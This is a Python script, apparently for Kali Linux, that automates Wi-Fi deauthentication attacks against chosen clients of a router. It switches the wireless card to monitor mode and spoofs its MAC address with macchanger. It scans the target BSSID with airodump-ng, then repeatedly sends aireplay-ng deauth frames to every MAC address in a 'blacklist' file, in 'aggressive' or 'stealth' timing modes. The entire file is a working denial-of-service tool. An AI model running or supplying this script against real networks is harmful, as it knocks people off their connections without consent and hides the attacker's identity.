#!/usr/bin/env python
#
# Deauthenticates Clients From A Network
#
import os
import sys
import time
import argparse
import threading
from subprocess import *

class Engine(object):
 def __init__(self,mac,channel,wlan,mode):
  self.bssid = mac     
  self.wlan  = wlan
  self.mode  = mode
  self.chan  = channel
  self.delay = 180 if mode == 'S' else 60

 def Monitor(self):
  call(['ifconfig',self.wlan,'down'])
  call(['iwconfig',self.wlan,'mode','monitor'])
  Popen(['macchanger','-r',self.wlan],stdout=Devnull,stderr=Devnull)
  call(['ifconfig',self.wlan,'up'])
  call(['service','network-manager','stop'])

 def Managed(self):
  call(['ifconfig',self.wlan,'down'])
  call(['iwconfig',self.wlan,'mode','managed'])
  Popen(['macchanger','-p',self.wlan],stdout=Devnull,stderr=Devnull)
  call(['ifconfig',self.wlan,'up'])
  call(['service','network-manager','restart'])
  exit()

 def Scan(self):
  cmd=['airodump-ng','--output-format','csv','--bssid',self.bssid,'-c',self.chan,'-w','list',self.wlan]
  Popen(cmd,stderr=Devnull,stdout=Devnull)
  time.sleep(self.delay)
  
 def Clean(self):
  for item in os.listdir('.'):
   if item.endswith('csv'):
    os.remove(item)

 def Attack(self,client):
  print '[-] Attack: {}'.format(client)
  cmd=['aireplay-ng','-0','1','-a',self.bssid,'-c',client,'--ignore-negative-one',self.wlan]
  Popen(cmd,stdout=Devnull,stderr=Devnull).wait()
  time.sleep(.7)

def from_file_to_list(file):
 list=[]

 # Verify blacklist
 if not os.path.exists(file):
  call(['clear'])
  exit('[!] Unable to locate: {}'.format(file))

 with open(file,'r') as _file:
  for item in _file:
   if ':' in item:
    new_item=item.strip()
    new_item.replace('\n','')
    list.append(new_item)

 if not len(list):
  call(['clear'])
  exit('[!] Unable to find mac addresses in: {}'.format(file))
 return list

def main():
 # Assign Arugments
 UserArgs = argparse.ArgumentParser() 
 UserArgs.add_argument('interface', help='wireless interface')
 UserArgs.add_argument('mac',       help='bssid of router')
 UserArgs.add_argument('mode',      help='[A]ggressive [S]tealth') # Aggressive: 15 sec; Stealth: 60 sec
 UserArgs.add_argument('channel',   help='Channel of router')
 UserArgs.add_argument('blacklist', help='path to blacklist')
 Args = UserArgs.parse_args()
 
 # Assign Variables
 list = Args.blacklist if Args.blacklist else Args.blacklist
 mode = Args.mode[0].upper() if Args.mode else Args.mode
 blacklist = from_file_to_list(list)
 wlan = Args.interface
 chan = Args.channel
 macs = Args.mac
 mode = mode[0]
 #
 mode   = 'S' if mode != 'A' and mode != 'S' else mode
 engine = Engine(macs,chan,wlan,mode)  

 # Enable Monitor Mode
 engine.Monitor()
 
 # Change Directory
 os.chdir('/tmp')

 # Start Proc
 while 1:
  try:
   call(['clear'])
   print '[+] Scanning: {}'.format(engine.bssid)
   engine.Clean()
   engine.Scan()
   for client in blacklist:
    engine.Attack(client)
  except KeyboardInterrupt:
   call(['clear'])
   Popen(['pkill','airodump-ng']).wait()
   Popen(['pkill','aireplay-ng']).wait()
   engine.Managed()

if __name__ == '__main__':
 # Filters
 if sys.platform != 'linux2':
  exit('[-] Kali Linux 2.0 Required!')

 if os.getuid():
  exit('[-] Root Access Required!')

 Devnull = open(os.devnull,'w')
 # Start 
 main()
